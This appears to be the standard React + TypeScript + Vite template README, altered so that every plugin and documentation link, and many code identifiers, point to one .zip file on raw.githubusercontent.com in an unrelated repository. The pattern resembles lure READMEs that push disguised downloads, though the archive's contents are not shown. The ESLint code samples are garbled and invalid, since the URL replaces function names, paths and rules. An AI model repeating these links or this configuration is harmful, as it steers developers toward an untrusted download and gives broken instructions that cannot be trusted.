# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip) uses [Babel](https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip) uses [SWC](https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type aware lint rules:

- Configure the top-level `parserOptions` property like this:

```js
export default https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip({
  languageOptions: {
    // other options...
    parserOptions: {
      project: ['https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip', 'https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip'],
      tsconfigRootDir: https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip,
    },
  },
})
```

- Replace `https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip` to `https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip` or `https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip`
- Optionally add `https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip`
- Install [eslint-plugin-react](https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip) and update the config:

```js
// https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip
import react from 'eslint-plugin-react'

export default https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip({
  // Set the react version
  settings: { react: { version: '18.3' } },
  plugins: {
    // Add the react plugin
    react,
  },
  rules: {
    // other rules...
    // Enable its recommended rules
    https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip,
    https://raw.githubusercontent.com/hossamesam/EcommerceByReact/v1.2_stable/src/components/common/errors/error2/By-React-Ecommerce-3.3.zip['jsx-runtime'].rules,
  },
})
```
